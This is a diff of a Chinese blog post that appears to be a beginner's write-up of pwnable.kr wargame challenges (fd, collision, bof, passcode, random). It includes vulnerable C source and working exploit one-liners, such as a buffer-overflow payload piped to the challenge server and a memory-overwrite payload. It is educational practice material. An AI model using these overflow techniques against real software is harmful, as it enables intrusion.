@@ -1,92 +1,106 @@
-
- <!DOCTYPE HTML>
-<html lang="zh-CN">
+<!DOCTYPE html>
+<html>
 <head>
-  <meta charset="UTF-8">
+  <meta charset="utf-8">
   
-    <title>pwnable.kr学习pwn--虽然是从零开始 | wWn&#39;s blog</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
-    
-    <meta name="author" content="Weinan Wu">
-    
-    <meta name="description" content="fd连入后，可以看到三个文件fd  fd.c  flag。查看fd.c源码只要把fd设置为0，即便准输入文件的文件描述符，然后读入的内容和”LETMEWIN\n”相同就可得到flag
-collision依旧是三个文件，源代码如下:需要输入20byte的passcode，在经过check_passwo">
-    
-    
-    
-    
-    
-    <link rel="icon" href="/img/favicon.ico">
-    
-    
-    <link rel="apple-touch-icon" href="/img/pacman.jpg">
-    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
-    
-    <link rel="stylesheet" href="/css/style.css">
+  <title>pwnable.kr学习pwn--虽然是从零开始 | wWn&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="fd连入后，可以看到三个文件fd  fd.c  flag。查看fd.c源码只要把fd设置为0，即便准输入文件的文件描述符，然后读入的内容和”LETMEWIN\n”相同就可得到flag collision依旧是三个文件，源代码如下:需要输入20byte的passcode，在经过check_password()函数处理后，和hashcode’0x21DD09EC’相等，就可以获得flag。check_">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.kr学习pwn--虽然是从零开始">
+<meta property="og:url" content="http://www.wuweinan.top/2017/04/11/pwnable-kr学习pwn-虽然是从零开始/index.html">
+<meta property="og:site_name" content="wWn's blog">
+<meta property="og:description" content="fd连入后，可以看到三个文件fd  fd.c  flag。查看fd.c源码只要把fd设置为0，即便准输入文件的文件描述符，然后读入的内容和”LETMEWIN\n”相同就可得到flag collision依旧是三个文件，源代码如下:需要输入20byte的passcode，在经过check_password()函数处理后，和hashcode’0x21DD09EC’相等，就可以获得flag。check_">
+<meta property="og:image" content="http://i.imgur.com/1VMtzNG.png">
+<meta property="og:image" content="http://i.imgur.com/olGTLwG.png">
+<meta property="og:image" content="http://i.imgur.com/JL7H2SQ.png">
+<meta property="og:image" content="http://i.imgur.com/h27tD3U.png">
+<meta property="og:image" content="http://i.imgur.com/mwQ7mhS.png">
+<meta property="og:image" content="http://i.imgur.com/23PkOpa.png">
+<meta property="og:image" content="http://i.imgur.com/tPM0XPp.png">
+<meta property="og:image" content="http://i.imgur.com/BkDCX1G.png">
+<meta property="og:image" content="http://i.imgur.com/0nrZccz.png">
+<meta property="og:updated_time" content="2017-04-16T02:25:47.568Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwnable.kr学习pwn--虽然是从零开始">
+<meta name="twitter:description" content="fd连入后，可以看到三个文件fd  fd.c  flag。查看fd.c源码只要把fd设置为0，即便准输入文件的文件描述符，然后读入的内容和”LETMEWIN\n”相同就可得到flag collision依旧是三个文件，源代码如下:需要输入20byte的passcode，在经过check_password()函数处理后，和hashcode’0x21DD09EC’相等，就可以获得flag。check_">
+<meta name="twitter:image" content="http://i.imgur.com/1VMtzNG.png">
+  
+    <link rel="alternate" href="/atom.xml" title="wWn&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
 </head>
 
-  <body>
-    <header>
-      <div>
-		
-			<div id="imglogo">
-				<a href="/"><img src="/img/logo.svg" alt="wWn&#39;s blog" title="wWn&#39;s blog"/></a>
-			</div>
-			
-			<div id="textlogo">
-				<h1 class="site-name"><a href="/" title="wWn&#39;s blog">wWn&#39;s blog</a></h1>
-				<h2 class="blog-motto">自觉觉人</h2>
-			</div>
-			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
-			</a></div>
-			<nav class="animated">
-				<ul>
-					
-						<li><a href="/">Home</a></li>
-					
-						<li><a href="/archives">归档</a></li>
-					
-					<li>
-					
-					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
-						<label>Search</label>
-						<input type="text" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
-						<input type="hidden" name="q" value="site:www.wuweinan.top">
-					</form>
-					
-					</li>
-				</ul>
-			</nav>			
-</div>
-
-    </header>
-    <div id="container">
-      <div id="main" class="post" itemscope itemprop="blogPost">
-	<article itemprop="articleBody"> 
-		<header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2017/04/11/pwnable-kr学习pwn-虽然是从零开始/" title="pwnable.kr学习pwn--虽然是从零开始" itemprop="url">pwnable.kr学习pwn--虽然是从零开始</a>
-  </h1>
-  <p class="article-author">By
-    
-      <a href="http://www.wuweinan.top" title="Weinan Wu">Weinan Wu</a>
-    </p>
-  <p class="article-time">
-    <time datetime="2017-04-11T05:56:15.000Z" itemprop="datePublished">2017-04-11</time>
-    更新日期:<time datetime="2017-04-16T02:25:47.568Z" itemprop="dateModified">2017-04-16</time>
-    
-  </p>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">wWn&#39;s blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">自觉觉人</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://www.wuweinan.top"></form>
+      </div>
+    </div>
+  </div>
 </header>
-	<div class="article-content">
-		
-		
-		<div id="toc" class="toc-article">
-			<strong class="toc-title">文章目录</strong>
-		<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fd"><span class="toc-number">1.</span> <span class="toc-text">fd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#collision"><span class="toc-number">2.</span> <span class="toc-text">collision</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bof"><span class="toc-number">3.</span> <span class="toc-text">bof</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag"><span class="toc-number">4.</span> <span class="toc-text">flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#passcode"><span class="toc-number">5.</span> <span class="toc-text">passcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#random"><span class="toc-number">6.</span> <span class="toc-text">random</span></a></li></ol>
-		</div>
-		
-		<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>连入后，可以看到三个文件fd  fd.c  flag。查看fd.c源码<br><img src="http://i.imgur.com/1VMtzNG.png" alt=""><br>只要把fd设置为0，即便准输入文件的文件描述符，然后读入的内容和”LETMEWIN\n”相同就可得到flag</p>
+      <div class="outer">
+        <section id="main"><article id="post-pwnable-kr学习pwn-虽然是从零开始" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/04/11/pwnable-kr学习pwn-虽然是从零开始/" class="article-date">
+  <time datetime="2017-04-11T05:56:15.000Z" itemprop="datePublished">2017-04-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      pwnable.kr学习pwn--虽然是从零开始
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>连入后，可以看到三个文件fd  fd.c  flag。查看fd.c源码<br><img src="http://i.imgur.com/1VMtzNG.png" alt=""><br>只要把fd设置为0，即便准输入文件的文件描述符，然后读入的内容和”LETMEWIN\n”相同就可得到flag</p>
 <h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><p>依旧是三个文件，源代码如下:<br><img src="http://i.imgur.com/olGTLwG.png" alt=""><br>需要输入20byte的passcode，在经过check_password()函数处理后，和hashcode’0x21DD09EC’相等，就可以获得flag。check_password()把passcode类型转化为int后，分为5组相加等于0x21DD09EC。所以干脆把0x21DD09EC分成5份，最好就是4个0x0101和一个0x1DD905E8。使用perl或者python可以简化输入过程。</p>
 <h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">void func(int key)&#123;</div><div class="line">        char overflowme[32];</div><div class="line">        printf(&quot;overflow me : &quot;);</div><div class="line">        gets(overflowme);       // smash me!</div><div class="line">        if(key == 0xcafebabe)&#123;</div><div class="line">                system(&quot;/bin/sh&quot;);</div><div class="line">        &#125;</div><div class="line">        else&#123;</div><div class="line">                printf(&quot;Nah..\n&quot;);</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line">int main(int argc, char* argv[])&#123;</div><div class="line">        func(0xdeadbeef);</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>漏洞在gets(overflowme)，需要通过溢出，将func(0xdeadbeef)的参数覆盖并修改为0xcafebabe。在GDB可以看到overflowme数组离ebp 0x2c字节，再加上ebp,返回地址8个字节，需要52字节。<br><img src="http://i.imgur.com/JL7H2SQ.png" alt=""><br>使用python构造:(python -c ‘print “A”*52 + “\xbe\xba\xfe\xca”‘;cat -)|nc pwnable.kr 9000</p>
@@ -99,227 +113,139 @@ collision依旧是三个文件，源代码如下:需要输入20byte的passcode�
 <p>所以构造shellcode,结果不对，因为scanf中用%d读取数据，所以第二个地址要换成十进制数<br>python -c ‘print “A”*96 + “\x04\xa0\x04\x08” + “\xe3\x85\x04\x08”‘ | ./passcode</p>
 <h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">int main()&#123;</div><div class="line">        unsigned int random;</div><div class="line">        random = rand();        // random value!</div><div class="line"></div><div class="line">        unsigned int key=0;</div><div class="line">        scanf(&quot;%d&quot;, &amp;key);</div><div class="line"></div><div class="line">        if( (key ^ random) == 0xdeadbeef )&#123;</div><div class="line">                printf(&quot;Good!\n&quot;);</div><div class="line">                system(&quot;/bin/cat flag&quot;);</div><div class="line">                return 0;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        printf(&quot;Wrong, maybe you should try 2^32 cases.\n&quot;);</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>rand()产生的是伪随机数，每次随机的数都一样，修改random.c，跑一次打印出随机数是多少就可解得flag。</p>
-  
-	</div>
-		<footer class="article-footer clearfix">
 
-  <div class="article-tags">
-  
-  <span></span> <a href="/tags/pwn/">pwn</a>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.wuweinan.top/2017/04/11/pwnable-kr学习pwn-虽然是从零开始/" data-id="cj1kt88hs0003n8rheu01zpfd" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+
+    </footer>
   </div>
-
-
-
-
-<div class="article-share" id="share">
-
-  <div data-url="http://www.wuweinan.top/2017/04/11/pwnable-kr学习pwn-虽然是从零开始/" data-title="pwnable.kr学习pwn--虽然是从零开始 | wWn&#39;s blog" data-tsina="null" class="share clearfix">
-  </div>
-
-</div>
-</footer>   	       
-	</article>
-	
-<nav class="article-nav clearfix">
- 
- <div class="prev" >
- <a href="/2017/04/08/python-装饰器/" title="python 函数工具">
-  <strong>PREVIOUS:</strong><br/>
-  <span>
-  python 函数工具</span>
-</a>
-</div>
-
-
-<div class="next">
-<a href="/2017/04/11/python网络编程学习记录/"  title="python网络编程学习记录">
- <strong>NEXT:</strong><br/> 
- <span>python网络编程学习记录
-</span>
-</a>
-</div>
-
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/04/08/python-装饰器/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          python 函数工具
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/04/11/python网络编程学习记录/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">python网络编程学习记录</div>
+    </a>
+  
 </nav>
 
-	
-</div>  
-      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+  
+</article>
 
-  <div id="toc" class="toc-aside">
-  <strong class="toc-title">文章目录</strong>
-  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fd"><span class="toc-number">1.</span> <span class="toc-text">fd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#collision"><span class="toc-number">2.</span> <span class="toc-text">collision</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bof"><span class="toc-number">3.</span> <span class="toc-text">bof</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag"><span class="toc-number">4.</span> <span class="toc-text">flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#passcode"><span class="toc-number">5.</span> <span class="toc-text">passcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#random"><span class="toc-number">6.</span> <span class="toc-text">random</span></a></li></ol>
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a></li></ul>
+    </div>
   </div>
 
-<div id="asidepart">
-<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
-<aside class="clearfix">
 
   
-
-  
-<div class="tagslist">
-	<p class="asidetitle">标签</p>
-		<ul class="clearfix">
-		
-			<li><a href="/tags/pwn/" title="pwn">pwn<sup>1</sup></a></li>
-		
-			<li><a href="/tags/python/" title="python">python<sup>1</sup></a></li>
-		
-			<li><a href="/tags/sql/" title="sql">sql<sup>1</sup></a></li>
-		
-		</ul>
-</div>
-
-
-  <div class="linkslist">
-  <p class="asidetitle">友情链接</p>
-    <ul>
-      <li><a href="http://yangjian.me" target="_blank" title="YangJian">Alimon's Blog</a></li>
-      <li><a href="http://hexo.io" target="_blank" title="Hexo">Hexo</a></li>
-    </ul>
-</div>
-
-
-  
-
-</aside>
-</div>
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/sql/" style="font-size: 10px;">sql</a>
     </div>
-    <footer><div id="footer" >
-	
-	<div class="line">
-		<span></span>
-		<div class="author"></div>
-	</div>
-	
-	
-	<div class="social-font clearfix">
-		
-		
-		
-		
-		
-	</div>
-		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="Pacman">Pacman</a> © 2017 
-		
-		<a href="http://www.wuweinan.top" target="_blank" title="Weinan Wu">Weinan Wu</a>
-		
-		</p>
-</div>
-</footer>
-    <script src="/js/jquery-2.1.0.min.js"></script>
-<script type="text/javascript">
-$(document).ready(function(){ 
-  $('.navbar').click(function(){
-    $('header nav').toggleClass('shownav');
-  });
-  var myWidth = 0;
-  function getSize(){
-    if( typeof( window.innerWidth ) == 'number' ) {
-      myWidth = window.innerWidth;
-    } else if( document.documentElement && document.documentElement.clientWidth) {
-      myWidth = document.documentElement.clientWidth;
-    };
-  };
-  var m = $('#main'),
-      a = $('#asidepart'),
-      c = $('.closeaside'),
-      o = $('.openaside');
-  $(window).resize(function(){
-    getSize(); 
-    if (myWidth >= 1024) {
-      $('header nav').removeClass('shownav');
-    }else
-    {
-      m.removeClass('moveMain');
-      a.css('display', 'block').removeClass('fadeOut');
-      o.css('display', 'none');
-      
-      $('#toc.toc-aside').css('display', 'none');
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">四月 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
         
-    }
-  });
-  c.click(function(){
-    a.addClass('fadeOut').css('display', 'none');
-    o.css('display', 'block').addClass('fadeIn');
-    m.addClass('moveMain');
-  });
-  o.click(function(){
-    o.css('display', 'none').removeClass('beforeFadeIn');
-    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
-    m.removeClass('moveMain');
-  });
-  $(window).scroll(function(){
-    o.css("top",Math.max(80,260-$(this).scrollTop()));
-  });
-});
-</script>
+          <li>
+            <a href="/2017/04/11/python网络编程学习记录/">python网络编程学习记录</a>
+          </li>
+        
+          <li>
+            <a href="/2017/04/11/pwnable-kr学习pwn-虽然是从零开始/">pwnable.kr学习pwn--虽然是从零开始</a>
+          </li>
+        
+          <li>
+            <a href="/2017/04/08/python-装饰器/">python 函数工具</a>
+          </li>
+        
+          <li>
+            <a href="/2017/04/05/SQL-lab-writeup/">SQL-lab writeup</a>
+          </li>
+        
+          <li>
+            <a href="/2017/04/05/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
 
-<script type="text/javascript">
-$(document).ready(function(){ 
-  var ai = $('.article-content>iframe'),
-      ae = $('.article-content>embed'),
-      t  = $('#toc'),
-      h  = $('article h2')
-      ah = $('article h2'),
-      ta = $('#toc.toc-aside'),
-      o  = $('.openaside'),
-      c  = $('.closeaside');
-  if(ai.length>0){
-    ai.wrap('<div class="video-container" />');
-  };
-  if(ae.length>0){
-   ae.wrap('<div class="video-container" />');
-  };
-  if(ah.length==0){
-    t.css('display','none');
-  }else{
-    c.click(function(){
-      ta.css('display', 'block').addClass('fadeIn');
-    });
-    o.click(function(){
-      ta.css('display', 'none');
-    });
-    $(window).scroll(function(){
-      ta.css("top",Math.max(140,320-$(this).scrollTop()));
-    });
-  };
-});
-</script>
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 Weinan Wu<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
 
-
-<script type="text/javascript">
-$(document).ready(function(){ 
-  var $this = $('.share'),
-      url = $this.attr('data-url'),
-      encodedUrl = encodeURIComponent(url),
-      title = $this.attr('data-title'),
-      tsina = $this.attr('data-tsina');
-  var html = [
-  '<a href="#" class="overlay" id="qrcode"></a>',
-  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
-  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
-  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
-  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
-  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
-  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
-  '<span title="Share to"></span>'
-  ].join('');
-  $this.append(html);
-  $('.article-share-qrcode').click(function(){
-    var imgSrc = $('#qrcode-pic').attr('data-src');
-    $('#qrcode-pic').attr('src', imgSrc);
-    $('#qrcode-pic').load(function(){
-        $('.qrcode strong').text(' ');
-    });
-  });
-});     
-</script>
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
 
 
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
 
 
+<script src="/js/script.js"></script>
 
-
-  </body>
+  </div>
+</body>
 </html>
